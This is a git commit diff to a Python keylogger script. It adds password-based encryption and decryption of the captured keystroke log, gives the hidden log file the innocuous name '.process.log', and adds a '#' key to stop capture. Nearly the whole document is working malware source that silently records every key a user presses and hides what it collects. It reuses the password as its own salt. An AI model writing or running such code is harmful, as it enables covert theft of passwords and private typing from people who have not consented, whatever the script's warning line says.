2e6bd91c1cae712656081b8238f32061c824da17
Nathan Hartley <91960789+NateHartley@users.noreply.github.com>
2025-01-30 18:00:01 +0000

    Log file can be encrypted and decrypted with user provided key

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,11 @@
 import keyboard
 import argparse
 import time
+import os
+import base64
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 parser = argparse.ArgumentParser(
     prog="Python Keylogger",
@@ -8,30 +13,83 @@ parser = argparse.ArgumentParser(
     epilog="Do not use without permission from the targeted user."
 )
 
-parser.add_argument("-k", "--key", help="used to encrypt/decrypt contents of .keystrokes.log")
+parser.add_argument("-f", "--format", action="store_true", help="writes each keypress on a new line in log file")
 parser.add_argument("-t", "--time", type=int, help="number of seconds the program with run for")
-parser.add_argument("-f", "--format", action="store_true", help="prints each keypress on a new line in .keystrokes.log")
+parser.add_argument("-e", "--encrypt", help="takes in a string that's used to encrypt contents of log file")
+parser.add_argument("-d", "--decrypt", help="takes in a string that's used to decrypt contents of log file")
 
 args = parser.parse_args()
-key = args.key
-seconds = args.time
 f = args.format
+seconds = args.time
+enc_key = args.encrypt
+dec_key = args.decrypt
 
-# beginning . hides log file
-log_file = ".keystrokes.log"
+log_file = ".process.log"
 
-# w mode so log file is overwritten on run
-open(log_file, "w").close()
+if dec_key == None:
+    print("Capturing strokes...")
+    # w mode so log file is overwritten on run
+    open(log_file, "w").close()
 
-def press_key(event):
-    with open(log_file, "a") as file:
-        if f:
-            # Each key press on new line
-            file.write("{}\n".format(event.name))
-        else:
-            # All key presses on same line
-            file.write(event.name)
+    def press_key(event):
+        with open(log_file, "a") as file:
+            if f:
+                # Each key press on new line
+                file.write("{}\n".format(event.name))
+            else:
+                # All key presses on same line
+                file.write(event.name)
 
-keyboard.on_press(press_key)
+    keyboard.on_press(press_key)
 
-keyboard.wait()
+    # If hashtag is pressed then program will quit
+    keyboard.wait("#")
+
+if enc_key != None and dec_key == None:
+    bytes = str.encode(enc_key)
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=bytes,
+        iterations=390000
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(bytes))
+    fernet = Fernet(key)
+
+    with open(log_file, 'rb') as file:
+        original = file.read()
+
+    encrypted = fernet.encrypt(original)
+
+    with open(log_file, 'wb') as encrypted_file:
+        encrypted_file.write(encrypted)
+
+    print("- Log file has been encrypted -")
+
+if (dec_key != None and enc_key == None) and (f == False and seconds == None):
+    bytes = str.encode(dec_key)
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=bytes,
+        iterations=390000
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(bytes))
+    fernet = Fernet(key)
+
+    with open(log_file, 'rb') as file:
+        encrypted = file.read()
+
+    try:
+        decrypted = fernet.decrypt(encrypted)
+    except:
+        print("Error: File could not be decrypted, incorrect key.")
+        exit()
+
+    with open(log_file, 'wb') as dec_file:
+        dec_file.write(decrypted)
+
+    print("- Log file has been decrypted -")
+
+elif dec_key != None:
+    print("Error: Only a singular argument may be parsed when decrypting, no flags other than -d should be inputted.")
